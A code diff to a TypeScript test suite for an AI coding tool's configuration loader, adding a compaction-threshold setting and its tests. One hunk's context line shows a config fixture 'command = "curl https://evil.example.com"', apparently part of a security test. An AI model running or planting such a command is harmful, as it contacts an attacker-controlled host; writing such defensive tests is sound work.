@@ -6,7 +6,7 @@ import { resolveApiKey } from "../src/config/keys";
 import { loadConfig, loadConfigSync } from "../src/config/loader";
 import { globalConfigPath, projectConfigPath, sessionsDir, starHome } from "../src/config/paths";
 import type { ProviderConfig } from "../src/config/schema";
-import { contextWindowTokens } from "../src/config/schema";
+import { contextWindowTokens, resolveCompactThreshold } from "../src/config/schema";
 
 let home: string;
 let cwd: string;
@@ -57,7 +57,7 @@ describe("loadConfig", () => {
       contextMaxTokens: 100_000,
       streamIdleTimeoutSec: 20,
       streamFirstChunkTimeoutSec: 300,
-      streamMaxRetries: 3,
+      streamMaxRetries: 5,
       maxAutoContinues: 2,
       contextCompaction: "summary",
       notifyBell: true,
@@ -115,6 +115,20 @@ model = "m"
     expect(contextWindowTokens(config, "big")).toBe(272_000);
     expect(contextWindowTokens(config, "plain")).toBe(config.contextMaxTokens);
     expect(contextWindowTokens(config, "missing")).toBe(config.contextMaxTokens);
+  });
+
+  it("loads compactThresholdTokens and resolves the auto-compact threshold", async () => {
+    writeFile(globalConfigPath(), "compactThresholdTokens = 700000\n");
+    const config = await loadConfig(cwd);
+    expect(config.compactThresholdTokens).toBe(700_000);
+    // Below the window: honored, so auto-compaction fires earlier.
+    expect(resolveCompactThreshold(config, 1_000_000)).toBe(700_000);
+    // A stale threshold above the current window clamps down to it.
+    expect(resolveCompactThreshold(config, 100_000)).toBe(100_000);
+    // Unset: compaction triggers at the full window (previous behavior).
+    expect(resolveCompactThreshold({ ...config, compactThresholdTokens: undefined }, 100_000)).toBe(
+      100_000,
+    );
   });
 
   it("project config overrides global config", async () => {
@@ -273,6 +287,7 @@ command = "curl https://evil.example.com"
       `defaultModel = "project-model"
 maxSteps = 20
 contextMaxTokens = 50000
+compactThresholdTokens = 40000
 streamIdleTimeoutSec = 30
 streamFirstChunkTimeoutSec = 120
 streamMaxRetries = 5
@@ -294,6 +309,7 @@ model = "m"
     expect(config.defaultModel).toBe("project-model");
     expect(config.maxSteps).toBe(20);
     expect(config.contextMaxTokens).toBe(50_000);
+    expect(config.compactThresholdTokens).toBe(40_000);
     expect(config.streamIdleTimeoutSec).toBe(30);
     expect(config.streamFirstChunkTimeoutSec).toBe(120);
     expect(config.streamMaxRetries).toBe(5);
